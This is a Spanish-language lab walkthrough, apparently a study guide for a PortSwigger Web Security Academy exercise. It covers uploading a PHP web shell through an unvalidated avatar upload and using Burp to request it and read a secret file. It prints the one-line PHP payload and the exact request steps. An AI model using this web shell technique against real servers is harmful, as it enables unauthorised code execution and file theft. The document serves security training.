# Lab — Remote code execution via web shell upload

> Fuente principal: solución oficial de PortSwigger Web Security Academy.

## Objetivo exacto

Subir un archivo PHP ejecutable mediante la función de avatar, usarlo para leer:

```text
/home/carlos/secret
```

y enviar el valor mediante **Submit solution**.

## Credenciales proporcionadas

```text
wiener:peter
```

---

# Qué enseña este lab

Este es el caso más simple de File Upload:

```text
upload sin validación
        ↓
archivo PHP guardado
        ↓
archivo accesible por URL
        ↓
servidor interpreta PHP
        ↓
RCE / lectura de archivos
```

PortSwigger quiere que entendamos primero el caso sin bypasses.

---

# Procedimiento oficial paso a paso

## Paso 1 — Login

Iniciar sesión con:

```text
wiener:peter
```

Ir a **My account**.

Ahí aparece la función para subir un avatar.

---

## Paso 2 — Subir primero una imagen normal

Subir cualquier imagen como avatar.

Volver a la página de la cuenta y comprobar que aparece la preview.

¿Por qué hacemos esto?

Porque queremos descubrir **qué URL utiliza la aplicación para recuperar el archivo subido**.

---

## Paso 3 — Encontrar el GET del avatar en Burp

Ir a:

```text
Proxy
→ HTTP history
```

PortSwigger indica abrir el filtro de HTTP history y, bajo **Filter by MIME type**, habilitar **Images** para asegurarnos de ver las peticiones de imágenes.

Localizar una request parecida a:

```http
GET /files/avatars/mi-imagen.jpg HTTP/2
```

Esto revela la ubicación pública de los avatares:

```text
/files/avatars/
```

Clic derecho sobre esa request:

```text
Send to Repeater
```

---

## Paso 4 — Crear el archivo PHP

En nuestra máquina crear:

```text
exploit.php
```

con:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Este payload hace una sola cosa:

```text
leer /home/carlos/secret
→ imprimirlo en la respuesta HTTP
```

---

## Paso 5 — Subir `exploit.php`

Volver a **My account** y usar la función del avatar para seleccionar:

```text
exploit.php
```

Subirlo normalmente.

En este lab la aplicación no valida el tipo de archivo, por lo que debería indicar que el upload fue exitoso.

No hay que modificar MIME, extensión ni request en este primer lab.

---

## Paso 6 — Ejecutar el archivo desde Repeater

Volver al Repeater donde dejamos el GET del avatar.

Cambiar:

```http
GET /files/avatars/mi-imagen.jpg HTTP/2
```

por:

```http
GET /files/avatars/exploit.php HTTP/2
```

Pulsar:

```text
Send
```

---

## Paso 7 — Leer el secret

En la **Response** debería aparecer directamente una cadena que corresponde al contenido de:

```text
/home/carlos/secret
```

No esperes necesariamente una página HTML bonita.

En este lab la evidencia importante está en:

```text
Repeater → Response
```

Copiar exactamente ese valor.

---

## Paso 8 — Submit solution

Volver al banner/descripción del lab y pulsar:

```text
Submit solution
```

Pegar el secret.

El lab debería quedar:

```text
Solved
```

---

# Qué request/response debo reconocer

## Request para descubrir el archivo

```http
GET /files/avatars/<archivo> HTTP/2
```

## Request final

```http
GET /files/avatars/exploit.php HTTP/2
```

## Response final

```text
contenido de /home/carlos/secret
```

---

# Qué parte controlamos

En este lab controlamos:

```text
archivo subido
filename
contenido PHP
```

Pero PortSwigger no requiere modificar manualmente la request de upload porque **no existe validación relevante**.

---

# Burp que tengo que aprender

- `Proxy → HTTP history`;
- usar filtros para mostrar imágenes;
- identificar un `GET /files/avatars/...`;
- `Send to Repeater`;
- modificar el path de una request;
- leer directamente la Response.

---

# Por qué funciona

La aplicación acepta y almacena un archivo PHP sin restringirlo.

Después, el mismo servidor web sirve `/files/avatars/exploit.php` de una forma que hace que PHP sea interpretado.

```text
upload permitido
+
ubicación web accesible
+
ejecución PHP habilitada
=
Remote Code Execution
```

---

# Error frecuente

## "Subí exploit.php, pero no pasa nada"

Subirlo no ejecuta automáticamente el archivo.

Después hay que solicitarlo:

```text
/files/avatars/exploit.php
```

## "No veo la imagen en HTTP history"

Revisar el filtro de HTTP history y permitir contenido de tipo **Images**.

## "Veo código PHP en lugar del secret"

Eso significaría que el servidor está sirviendo el archivo como texto y no lo está ejecutando. En este lab, si todo está correcto, el PHP debe ejecutarse.

---

# Checklist

- [ ] Inicié sesión como `wiener`.
- [ ] Subí una imagen normal.
- [ ] Encontré `GET /files/avatars/<imagen>`.
- [ ] Lo envié a Repeater.
- [ ] Creé `exploit.php`.
- [ ] Subí `exploit.php`.
- [ ] Cambié el GET a `/files/avatars/exploit.php`.
- [ ] Leí el secret en Response.
- [ ] Envié el secret con Submit solution.
- [ ] Puedo explicar por qué el servidor ejecutó PHP.

---

# Regla para recordar

```text
UPLOAD ≠ EJECUCIÓN

upload
  ↓
localizar URL
  ↓
solicitar archivo
  ↓
servidor interpreta PHP
  ↓
resultado
```
